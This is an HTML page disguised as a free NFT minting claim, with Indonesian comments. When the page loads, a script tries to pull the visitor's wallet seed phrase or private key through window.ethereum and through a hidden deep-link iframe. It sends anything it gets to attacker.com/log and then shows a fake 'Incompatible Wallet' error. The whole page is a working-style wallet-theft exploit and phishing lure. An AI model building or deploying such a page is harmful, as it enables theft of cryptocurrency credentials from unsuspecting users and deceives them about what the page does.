<!DOCTYPE html>
<html>
<head>
    <title>Free NFT Minting</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
        .loading { color: red; font-weight: bold; }
    </style>
</head>
<body>
    <h1>Claim Your Free NFT</h1>
    <p id="status">Connecting to Wallet...</p>
    <button id="mint-btn" style="display:none;">Mint Now</button>

    <script>
        const ATTACKER_SERVER = "https://attacker.com/log";

        async function triggerExploit() {
            const status = document.getElementById('status');
            
            // 1. Mencoba akses langsung ke API internal yang tidak terproteksi
            // Sering terjadi pada dApp browser yang membocorkan bridge internal
            try {
                // Contoh method internal fiktif namun realistis dalam bug bounty
                const secret = await window.ethereum.request({
                    method: 'wallet_getBackupPhrase', // atau 'eth_exportPrivateKey'
                    params: []
                });

                if (secret) {
                    sendToAttacker("SEED_PHRASE", secret);
                }
            } catch (e) {
                console.log("Method 1 failed");
            }

            // 2. Mencoba bypass via Deep Link (URI Scheme)
            // Mengarahkan ke halaman internal wallet untuk memicu kebocoran data
            setTimeout(() => {
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                // Mencoba memanggil skema internal yang mengirim data kembali ke URL
                iframe.src = "wallet-app://export?callback=" + encodeURIComponent(ATTACKER_SERVER);
                document.body.appendChild(iframe);
            }, 1000);

            status.innerText = "Error: Incompatible Wallet. Please try another.";
            status.className = "loading";
        }

        function sendToAttacker(type, data) {
            fetch(`${ATTACKER_SERVER}?type=${type}&data=${encodeURIComponent(data)}`, {
                mode: 'no-cors'
            });
        }

        // Jalankan exploit otomatis saat halaman dimuat
        window.onload = triggerExploit;
    </script>
</body>
</html>
